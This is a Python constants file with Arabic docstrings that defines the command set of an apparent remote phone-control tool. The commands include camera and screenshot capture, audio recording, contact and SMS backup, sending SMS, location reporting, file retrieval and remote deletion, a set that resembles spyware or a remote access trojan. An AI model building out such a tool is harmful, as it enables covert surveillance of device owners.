"""
الأنواع الثابتة والأوامر
"""
from enum import Enum, auto
from typing import Optional


class CommandType(Enum):
    """أنواع الأوامر المدعومة."""

    SCREENSHOT = auto()
    CAMERA_FRONT = auto()
    CAMERA_BACK = auto()
    RECORD_AUDIO = auto()
    SEND_FOLDER = auto()
    SEND_FILE = auto()
    DELETE = auto()
    BACKUP_CONTACTS = auto()
    BACKUP_SMS = auto()
    SEND_SMS = auto()
    DEVICE_INFO = auto()
    BATTERY_STATUS = auto()
    LOCATION = auto()
    RESTART_SERVICE = auto()

    @classmethod
    def from_string(cls, value: str) -> Optional["CommandType"]:
        """تحويل النص إلى نوع أمر."""
        mapping = {
            "screenshot": cls.SCREENSHOT,
            "camera_front": cls.CAMERA_FRONT,
            "camera_back": cls.CAMERA_BACK,
            "record_audio": cls.RECORD_AUDIO,
            "send_folder": cls.SEND_FOLDER,
            "send_file": cls.SEND_FILE,
            "delete": cls.DELETE,
            "backup_contacts": cls.BACKUP_CONTACTS,
            "backup_sms": cls.BACKUP_SMS,
            "send_sms": cls.SEND_SMS,
            "device_info": cls.DEVICE_INFO,
            "battery_status": cls.BATTERY_STATUS,
            "location": cls.LOCATION,
            "restart_service": cls.RESTART_SERVICE,
        }
        return mapping.get(value)

    def needs_input(self) -> bool:
        """هل يحتاج الأمر مدخلات إضافية؟"""
        return self in {
            self.RECORD_AUDIO,
            self.SEND_FOLDER,
            self.SEND_FILE,
            self.DELETE,
            self.SEND_SMS,
        }

    def get_input_prompt(self) -> str:
        """الحصول على نص المطالبة للمدخلات."""
        prompts = {
            self.RECORD_AUDIO: "🎙️ **أدخل عدد الثواني (1-60):**",
            self.SEND_FOLDER: "📁 **أدخل مسار المجلد:**",
            self.SEND_FILE: "📄 **أدخل مسار الملف:**",
            self.DELETE: "🗑️ **أدخل مسار الملف/المجلد المراد حذفه:**",
            self.SEND_SMS: "📨 **أدخل الرقم والنص مفصولين بفاصلة:**\nمثال: `0561234567,نص الرسالة`",
        }
        return prompts.get(self, "أدخل البيانات المطلوبة:")